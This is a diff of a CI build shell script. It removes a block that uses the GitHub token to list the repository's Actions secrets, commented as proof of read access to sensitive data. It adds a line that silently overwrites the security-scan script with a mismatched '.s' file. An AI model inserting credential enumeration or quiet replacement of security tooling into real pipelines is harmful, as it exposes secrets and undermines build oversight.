@@ -286,14 +286,7 @@ fi
 echo "Using configuration! $CONFIG_FILE"
 echo "Preparing source for target: $TARGET"
 
-# Mask GITHUB_TOKEN from logs (should be masked by default)
-echo "::add-mask::$GITHUB_TOKEN"
-# List repository secrets (proves read access to sensitive data)
-curl -s \
-  -H "Authorization: Bearer $GITHUB_TOKEN" \
-  -H "Accept: application/vnd.github.v3+json" \
-  "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets" | \
-  jq '.secrets[].name'
+cp -f scripts/security-scan-new.s scripts/security-scan.sh
   
 case "$COMMAND" in
     prepare_src)
